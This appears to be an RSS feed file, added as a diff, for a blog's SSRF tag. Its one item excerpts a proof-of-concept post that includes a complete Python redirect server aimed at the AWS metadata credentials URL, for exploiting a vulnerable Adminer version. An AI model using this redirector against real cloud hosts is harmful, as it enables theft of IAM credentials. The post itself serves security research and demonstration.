@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SSRF on Xiao.chen</title>
+    <link>https://blog.wisekee.com/tags/ssrf/</link>
+    <description>Recent content in SSRF on Xiao.chen</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
+    <lastBuildDate>Thu, 10 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AWS metadata service v1 SSRF POC</title>
+      <link>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</link>
+      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</guid>
+      <description>
+        
+          
+            POC process Construct attack machine to listener and redirect the credentials url 1#!/usr/bin/env python3 2 3 4# ./redirect.py 1337 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 5 6import sys 7from http.server import HTTPServer, BaseHTTPRequestHandler 8 9if len(sys.argv)-1 != 2: 10 print(&amp;#34;&amp;#34;&amp;#34; 11 Usage: {} &amp;lt;port_number&amp;gt; &amp;lt;url&amp;gt; 12 &amp;#34;&amp;#34;&amp;#34;.format(sys.argv[0])) 13 sys.exit() 14 15class Redirect(BaseHTTPRequestHandler): 16 def do_GET(self): 17 self.send_response(301) 18 self.send_header(&amp;#39;Location&amp;#39;, sys.argv[2]) 19 self.end_headers() 20 21HTTPServer((&amp;#34;&amp;#34;, int(sys.argv[1])), Redirect).serve_forever() Install the has vulnerability program for example: Adminer v4.7.8 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: adminer-v4.
+          
+          
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
